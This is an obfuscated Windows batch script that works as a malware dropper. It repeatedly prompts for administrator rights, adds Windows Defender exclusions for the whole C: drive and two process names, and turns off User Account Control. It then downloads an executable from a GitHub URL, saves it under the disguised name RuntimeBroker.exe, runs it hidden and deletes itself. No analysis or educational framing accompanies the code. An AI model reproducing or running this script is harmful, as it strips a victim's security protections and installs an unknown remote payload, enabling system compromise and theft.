@echo off & setlocal enableDelayedExpansion
set "DSvtK=>nul" & set "nWH=SESSION" & set "SLxWs=NET" & set "WXtU=2>&1"
%SLxWs% %nWH% %DSvtK% %WXtU%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "tZyb=qux" & set "LEG=baz" & set "tRrra=foo" & set "JbGPf=bar" & rem HZuZg oJwSq JLMfJQX
set "eRfE=powershell -ExecutionPolicy Bypass -Command"
set "FsFFY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "ZSj='C:\' -ErrorAction SilentlyContinue"
!eRfE! "!FsFFY! !ZSj!" %DSvtK% %WXtU%
set "HCQ=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!eRfE! "!HCQ!" %DSvtK% %WXtU%
set "vVo=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!eRfE! "!vVo!" %DSvtK% %WXtU%
set "qjz=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "VTD=-Name 'EnableLUA' -Value 0"
!eRfE! "!qjz! !VTD!" %DSvtK% %WXtU%
set "vRuqj=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!eRfE! "!vRuqj!" %DSvtK% %WXtU%
if !errorlevel! neq 0 (goto %a%)
set "DYlLJ=timeout /t" & !DYlLJ! 2 %DSvtK% %WXtU%
set "BTgdJ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "lFM=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!eRfE! "!BTgdJ! !lFM!" %DSvtK% %WXtU%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!DYlLJ! 1 %DSvtK% %WXtU% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %DSvtK% %WXtU%
del /f /q "%~f0" %DSvtK% %WXtU%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %DSvtK% %WXtU%
if !errorlevel! neq 0 (!DYlLJ! 3 %DSvtK% %WXtU% & goto %b%)
exit /b
